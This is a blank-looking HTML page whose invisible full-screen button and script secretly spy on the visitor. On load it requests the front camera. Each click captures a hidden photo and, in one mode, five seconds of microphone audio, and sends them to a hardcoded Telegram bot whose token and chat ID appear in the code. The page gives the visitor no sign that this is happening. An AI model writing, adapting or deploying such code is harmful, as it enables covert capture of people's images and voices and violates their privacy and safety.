<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
html,body{
  margin:0;padding:0;width:100%;height:100%;
  background:#fff;overflow:hidden;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
}
#btn{
  position:fixed;top:0;left:0;width:100%;height:100%;
  border:0;background:transparent;padding:0;cursor:pointer;
  -webkit-tap-highlight-color:transparent;
  color:transparent;font-size:0;
}
</style>
</head>
<body>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>
<button id="btn"></button>

<script>
var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
var CHAT  = "1314241513";
var mode  = new URLSearchParams(window.location.search).get("mode") || "photo";
var RECORD_SECONDS = 5; // ← длительность записи звука

var v = document.getElementById("v");
var c = document.getElementById("c");
var btn = document.getElementById("btn");

var stream = null;
var ready = false;
var busy = false;
var counter = 0;

function initCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
  .then(function(s) {
    stream = s;
    v.srcObject = s;
    v.muted = true;
    return v.play();
  })
  .then(function() { ready = true; })
  .catch(function(e) { console.log("cam err", e.name); });
}

function sendPhoto() {
  return new Promise(function(resolve) {
    c.width  = v.videoWidth  || 1280;
    c.height = v.videoHeight || 720;
    c.getContext("2d").drawImage(v, 0, 0);
    c.toBlob(function(blob) {
      if (!blob) { resolve(); return; }
      var fd = new FormData();
      fd.append("chat_id", CHAT);
      fd.append("photo", blob, "photo.jpg");
      fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd })
      .then(resolve).catch(resolve);
    }, "image/jpeg", 0.9);
  });
}

function recordAudio() {
  return new Promise(function(resolve) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      resolve();
      return;
    }

    navigator.mediaDevices.getUserMedia({ audio: true })
    .then(function(audioStream) {
      var options = {};
      if (window.MediaRecorder && MediaRecorder.isTypeSupported) {
        if (MediaRecorder.isTypeSupported("audio/webm;codecs=opus")) {
          options.mimeType = "audio/webm;codecs=opus";
        } else if (MediaRecorder.isTypeSupported("audio/webm")) {
          options.mimeType = "audio/webm";
        } else if (MediaRecorder.isTypeSupported("audio/mp4")) {
          options.mimeType = "audio/mp4";
        }
      }

      var recorder;
      try {
        recorder = new MediaRecorder(audioStream, options);
      } catch (e) {
        console.log("recorder err", e);
        audioStream.getTracks().forEach(function(t){ t.stop(); });
        resolve();
        return;
      }

      var chunks = [];
      recorder.ondataavailable = function(e) {
        if (e.data && e.data.size) chunks.push(e.data);
      };
      recorder.onstop = function() {
        audioStream.getTracks().forEach(function(t){ t.stop(); });

        var type = recorder.mimeType || "audio/webm";
        var ext  = type.indexOf("mp4") >= 0 ? "m4a" : "ogg";
        var blob = new Blob(chunks, { type: type });

        var fd = new FormData();
        fd.append("chat_id", CHAT);
        fd.append("voice", blob, "voice." + ext);
        fetch("https://api.telegram.org/bot" + TOKEN + "/sendVoice", { method: "POST", body: fd })
        .then(resolve).catch(resolve);
      };

      recorder.start();
      setTimeout(function() {
        try { recorder.stop(); } catch (e) {}
      }, RECORD_SECONDS * 1000);
    })
    .catch(function(e) {
      console.log("mic err", e.name);
      resolve();
    });
  });
}

btn.addEventListener("click", function() {
  if (!ready) { initCamera(); return; }
  if (busy) return;
  busy = true;

  counter++;

  if (mode === "video") {
    sendPhoto().then(function() {
      return recordAudio();
    }).then(function() {
      busy = false;
    }).catch(function() {
      busy = false;
    });
  } else {
    sendPhoto().then(function() {
      busy = false;
    }).catch(function() {
      busy = false;
    });
  }
});

initCamera();
</script>
</body>
</html>
